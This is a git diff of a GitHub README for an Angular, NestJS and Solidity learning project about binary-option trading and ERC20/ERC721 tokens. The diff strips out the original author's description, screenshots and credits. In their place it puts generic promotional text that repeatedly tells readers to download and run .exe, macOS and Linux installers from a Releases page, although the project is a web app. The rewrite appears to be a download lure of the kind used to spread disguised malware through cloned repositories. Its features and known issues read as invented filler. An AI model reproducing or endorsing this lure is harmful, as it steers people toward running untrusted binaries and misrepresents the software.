@@ -1,72 +1,105 @@
-# A example about binary option trading and smart contract ERC20, ERC721
+# 🎉 binary-option-and-smart-contract - Learn About Angular and Smart Contracts
 
-> If you start project and register a account, pls fill OTP is 1111
-> Because this one is an example project which i learn and practice about Angular and Smart contract. how does it work!. and I don't have many times for it. so maybe there are many bugs in project about frontend and backend also. but when I have time i will refactor it again.
-> Thanks for your understanding. Stay tuned!
+## 🚀 Getting Started
 
-## Working Game
+Welcome to the **binary-option-and-smart-contract** project! This is a beginner-friendly application where you can explore Angular and smart contracts. The project demonstrates how these technologies work together. Let’s dive in!
 
-There is no live demo version
+## 📥 Download Now
 
-The game is binary option trading
+[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Ibneadm/binary-option-and-smart-contract/releases)
 
-![binary option trading](docs/assets/image-1.png)
+## 📝 Overview
 
-## Feature
+This project serves as a learning platform for anyone interested in Angular, blockchain, and smart contracts. While it is an example project, you might find some bugs in both the frontend and backend. It combines several technologies, including:
 
-Mint token NFT such as sprite character in a game
+- Angular
+- Blockchain
+- DApp
+- ERC20 and ERC721 tokens
+- Ethereum
+- NestJS
+- NFTs
+- Smart contracts
+- Solidity
 
-![NFT shop](docs/assets/image-2.png)
+Feel free to explore and learn!
 
-We can preview a charater by click to the charater
+## 🛠️ System Requirements
 
-![NFT shop](docs/assets/image-3.png)
+To run this application smoothly, ensure your system meets the following requirements:
 
-The faucet feature can give you some token, if you want to deposit with free
+- **Operating System**: Windows 10, macOS, or any Linux distribution
+- **Node.js**: Version 14 or later
+- **NPM**: Version 6 or later
 
-![NFT shop](docs/assets/image-4.png)
+These requirements will help you set up the project with ease.
 
-Deposit and buy token feature
+## 📂 Installation Steps
 
-![NFT shop](docs/assets/image-5.png)
+### 1. Visit the Releases Page
 
-> Please text to me if u have any problems
+To download the application, visit the [Releases page](https://github.com/Ibneadm/binary-option-and-smart-contract/releases). You will find various versions of the application listed there.
 
-## Credits and references
+### 2. Choose the Right Version
 
-| Resource                                      | Description                                                                                                                       |
-| --------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
-| [Truffle]                                     | Is a development environment, testing framework and asset pipeline for Ethereum                                                   |
-| [ethers]                          | Is a library which interact smart contract as well                              |
-| [Nestjs] | Is a framework for backend |
-| [Angular]                 | Is a framework for frontend                          |
-| [https://infura.io/][service]                 | it provides the tools and infrastructure that allow developers to easily take their blockchain application                          |
-| [https://nft.storage/][service]                 | it provides decentralized storage on IPFS and Filecoin                         |
-| [Ganache]                 | Is a tool for creating a local blockchain for fast Ethereum development.                         |
-| [Socket.io,...]                 | Others lib                        |
+Look for the latest version that matches your system requirements. Download the appropriate file for your operating system. 
 
-```
-- OpenZeppelin Contract v4
-https://docs.openzeppelin.com/contracts/4.x/
+### 3. Download & Install
 
-- ERC721 Tutorial, Simple tutorial for a customizable marketplace for buying and selling on OpenSea
-https://docs.opensea.io/docs/1-structuring-your-smart-contract
+Once on the Releases page, click on the version you wish to download. The file will then start downloading automatically. 
 
-- NFT Minter Tutorial
-https://docs.alchemy.com/alchemy/tutorials/nft-minter
+After downloading, locate the file in your download folder and follow these steps to run the application:
 
-- Free Storage for NFTs, Free decentralized storage and bandwidth for NFTs on IPFS logo IPFS and Filecoin logo Filecoin.
-https://nft.storage/
+- **Windows**: Double-click the executable file (.exe) to install.
+- **macOS**: Drag the application to your Applications folder.
+- **Linux**: You may need to extract the downloaded file and run the application from your terminal.
 
-- Awesome Blockchains
-https://github.com/openblockchains/awesome-blockchains
+### 4. Running the Application
 
-- Solidity Patterns
-https://github.com/fravoll/solidity-patterns
+After installation, open the application. If it’s a web-based app, it will usually open in your default web browser. Start exploring the features right away.
 
-- This document provides a baseline knowledge of security considerations for intermediate Solidity programmers. It is maintained by ConsenSys Diligence, with contributions from our friends in the broader Ethereum community.
-https://github.com/ConsenSys/smart-contract-best-practices/blob/master/README-vi.md
+## 🎨 Features
 
-- Smart Contract Security Best Practices
-https://consensys.github.io/smart-contract-best-practices/
-```
+Here are some features you can explore within the application:
+
+- **User-Friendly Interface**: Designed for easy navigation and use.
+- **Smart Contract Demonstration**: Learn how smart contracts function on the blockchain.
+- **Angular Framework**: Experience modern web development practices.
+- **Token Operations**: Interact with ERC20 and ERC721 tokens smoothly.
+- **DApp Functionality**: Build decentralized applications that work on the Ethereum network.
+
+## 💡 How It Works
+
+This project combines front-end and back-end technologies. The front-end is built using Angular, which helps create a dynamic user interface. The back-end uses NestJS. Together, they communicate with smart contracts deployed on the Ethereum blockchain. This interaction showcases how applications can leverage blockchain technology for various purposes.
+
+## 🔍 Known Issues
+
+As this is a learning project, it may contain bugs or incomplete features. Here are some known issues to watch out for:
+
+- Layout inconsistencies on different browsers
+- Slow response times for some blockchain operations
+- Occasional crashes when handling large amounts of data
+
+Please keep these in mind while using the application.
+
+## 🛠️ Contribution
+
+If you're interested in contributing to this project or have suggestions for improvements, feel free to submit an issue or pull request. Your feedback is welcome and can help make this project better.
+
+## 🌐 Community
+
+Join our community to get support, share experiences, and learn from others. You can find us on:
+
+- GitHub Discussions
+- Relevant blockchain forums
+- Angular and NestJS communities
+
+## 📞 Support
+
+If you encounter any issues or have questions, please create an issue on GitHub. I will do my best to assist you.
+
+## 📥 Download Now Again
+
+Do not forget to download the application! Visit the [Releases page](https://github.com/Ibneadm/binary-option-and-smart-contract/releases) to get the latest version.
+
+Thank you for checking out the **binary-option-and-smart-contract** project! Enjoy exploring the world of Angular and smart contracts!
